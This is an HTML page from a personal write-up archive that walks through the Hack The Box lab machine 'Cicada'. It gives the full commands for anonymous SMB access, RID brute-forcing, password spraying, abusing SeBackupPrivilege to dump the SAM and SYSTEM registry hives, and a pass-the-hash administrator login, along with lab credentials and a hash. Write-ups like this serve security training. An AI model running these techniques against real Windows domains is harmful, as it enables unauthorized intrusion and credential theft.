@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cicada - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <!-- Machine-specific metadata for SEO -->
+    <meta name="description" content="Detailed writeup for Cicada machine from HackTheBox - Easy difficulty level">
+    <meta name="keywords" content="HackTheBox, Cicada, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../index.html" class="logo">All writeups</a>
+            <div class="header-controls">
+                <a href="#" class="htb-icon" title="Link to the main page(Coming soon!)">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="machine-list" id="easy-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="machine-list" id="medium-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="machine-list" id="hard-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="machine-list" id="insane-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">Cicada</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty easy">Easy</span>
+            <span class="date">February 15, 2025</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Machine-specific content goes here -->
+                <p><img alt="Completion popup" src="../images/Cicada/pwned.png" /></p>
+<p>Cicada is a beginner-friendly Windows machine that introduces fundamental Active Directory enumeration and exploitation techniques.
+This was one of the first boxes I rooted on Hack The Box, and I learned a lot in the process!</p>
+<h1>User flag</h1>
+<p>Lets start off with an nmap scan:</p>
+<div class="codehilite"><pre><span></span><code>nmap -sV -sC -Pn -oA cicada1 10.10.11.35
+</code></pre></div>
+
+<p><img alt="Nmap Scan" src="../images/Cicada/nmap_scan.png" /></p>
+<p>Looking at the results, we can tell that this will be an Active Directory scenario. We get the domain name "Cicada.htb", as well as the name of the Domain Controller "CICADA-DC"</p>
+<p><img alt="Adding to hostfile" src="../images/Cicada/hostfile.png" /></p>
+<h2>Anonymous login via SMB</h2>
+<p>The first thing I would like to try is an anonymous login via SMB. We can do so by providing a nonexistent username and a blank password:</p>
+<div class="codehilite"><pre><span></span><code>crackmapexec smb 10.10.11.35 -u &#39;nonexistent&#39; -p &#39;&#39; --shares
+</code></pre></div>
+
+<p><img alt="Anonymous login reveals a readable HR share" src="../images/Cicada/AnonShares.png" /></p>
+<p>We have read permissions over IPC$ and HR shares. IPC$, NETLOGON and SYSVOL are standard shares, so we'll focus on HR.</p>
+<div class="codehilite"><pre><span></span><code>smbclient //10.10.11.35/HR -U cicada.htb/nonexistent
+</code></pre></div>
+
+<p><img alt="Downloading the text file" src="../images/Cicada/HR.png" /></p>
+<p>Lets read the file:</p>
+<p><img alt="Reading the notice" src="../images/Cicada/cat.png" /></p>
+<p>We have a potential password! Now we need to get a list of valid users so that we can perform password spraying:</p>
+<h2>User enumeration</h2>
+<div class="codehilite"><pre><span></span><code>crackmapexec smb 10.10.11.35 -u &#39;nonexistent&#39; -p &#39;&#39; --rid-brute
+</code></pre></div>
+
+<p><img alt="RID-brute" src="../images/Cicada/RID-brute.png" /></p>
+<p>Now that we have a list of users, we can proceed with password spraying via crackmapexec:</p>
+<p><img alt="password spray" src="../images/Cicada/password-spray.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="n">crackmapexec</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="mf">10.10.11.35</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">userlistfinal</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="s1">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span><span class="w"> </span><span class="c1">--continue-on-success</span>
+</code></pre></div>
+
+<h2>Bloodhound enumeration</h2>
+<p>With a valid user, we can use bloodhound-python to enumerate the domain and then bloodhound itself to have a better view of the data.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">bloodhound</span><span class="o">-</span><span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="ow">all</span><span class="w"> </span><span class="c1">--zip -d cicada.htb -u michael.wrightson -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span>
+</code></pre></div>
+
+<p>In the description field of user David.Orelious, we discover a password!</p>
+<p><img alt="David's password in the description field" src="../images/Cicada/description_password.png" /></p>
+<div class="codehilite"><pre><span></span><code>david.orelious:aRt$Lp#7t*VQ!3
+</code></pre></div>
+
+<h2>Accessing the DEV share</h2>
+<p>Previously we saw an unaccessible share named DEV. Lets try getting it with David's credentials:</p>
+<div class="codehilite"><pre><span></span><code>smbclient //10.10.11.35/DEV -U cicada.htb/david.orelious                                    
+</code></pre></div>
+
+<p><img alt="backup script in the DEV share" src="../images/Cicada/backup_script.png" /></p>
+<p>Lets check out the script:</p>
+<p><img alt="Powershell script" src="../images/Cicada/emily_credentials.png" /></p>
+<p>We've got creds for the user Emily!</p>
+<div class="codehilite"><pre><span></span><code><span class="n">emily</span><span class="p">.</span><span class="nl">oscars</span><span class="p">:</span><span class="n">Q</span><span class="err">!</span><span class="mi">3</span><span class="nv">@Lp</span><span class="n">#M6b</span><span class="o">*</span><span class="mi">7</span><span class="n">t</span><span class="o">*</span><span class="n">Vt</span>
+</code></pre></div>
+
+<p>Lets try logging into the machine as Emily:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="mf">10.10.11.35</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">emily</span><span class="p">.</span><span class="n">oscars</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="s1">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span>
+</code></pre></div>
+
+<p><img alt="Getting the user flag" src="../images/Cicada/user_flag.png" /></p>
+<h1>Root flag</h1>
+<p>Lets check the privileges of our user:</p>
+<div class="codehilite"><pre><span></span><code>whoami /priv
+</code></pre></div>
+
+<p><img alt="Privileges of the user Emily" src="../images/Cicada/emily_privileges.png" /></p>
+<h2>Cloning the registry hives</h2>
+<p>Emily has the SeBackupPrivilege. This privilege can be abused to extract registry hives (SAM and SYSTEM), allowing retrieval of the local administrator’s password hash</p>
+<div class="codehilite"><pre><span></span><code><span class="n">cd</span><span class="w"> </span><span class="nl">C:</span><span class="se">\</span>
+<span class="n">mkdir</span><span class="w"> </span><span class="kt">reg</span>
+<span class="kt">reg</span><span class="w"> </span><span class="n">save</span><span class="w"> </span><span class="n">hklm\sam</span><span class="w"> </span><span class="nl">c:</span><span class="n">\reg\sam</span>
+<span class="kt">reg</span><span class="w"> </span><span class="n">save</span><span class="w"> </span><span class="n">hklm\system</span><span class="w"> </span><span class="nl">c:</span><span class="n">\reg\system</span>
+<span class="n">cd</span><span class="w"> </span><span class="kt">reg</span>
+</code></pre></div>
+
+<p><img alt="Reg hives in our location" src="../images/Cicada/saved_reg_hives.png" /></p>
+<p>Now we need to get them onto our machine:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">download</span><span class="w"> </span><span class="n">sam</span>
+<span class="n">download</span><span class="w"> </span><span class="n">system</span>
+</code></pre></div>
+
+<p>Afterwards, we can use impacket-secretsdump to get the administrator's hash:</p>
+<div class="codehilite"><pre><span></span><code>impacket-secretsdump -system system -sam sam -outputfile cicada.secrets -dc-ip 10.10.11.35 -target-ip 10.10.11.35 local     
+</code></pre></div>
+
+<p><img alt="Getting the secrets" src="../images/Cicada/secrets.png" /></p>
+<p>Now all that's left to do is to log in as the administrator, and get the root flag!</p>
+<div class="codehilite"><pre><span></span><code>evil-winrm -i 10.10.11.35 -u administrator -H &#39;2b87e7c93a3e8a0ea4a581937016f341&#39;
+</code></pre></div>
+
+<p><img alt="Getting the root flag" src="../images/Cicada/root.png" /></p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Machine metadata for sidebar population
+        let machineData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch machine metadata
+                const response = await fetch('../machines.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load machine metadata');
+                }
+                machineData = await response.json();
+                
+                // Populate the sidebar with machine links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with machine links dynamically
+        function populateSidebar() {
+            const categories = {
+                "easy": document.getElementById("easy-machines"),
+                "medium": document.getElementById("medium-machines"),
+                "hard": document.getElementById("hard-machines"),
+                "insane": document.getElementById("insane-machines")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add machine links to appropriate categories
+            for (const [machineName, data] of Object.entries(machineData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../machines/${machineName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current machine
+                    if (data.title === "Cicada") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const machineList = document.querySelector(`#${difficulty}-machines`);
+                    
+                    machineList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
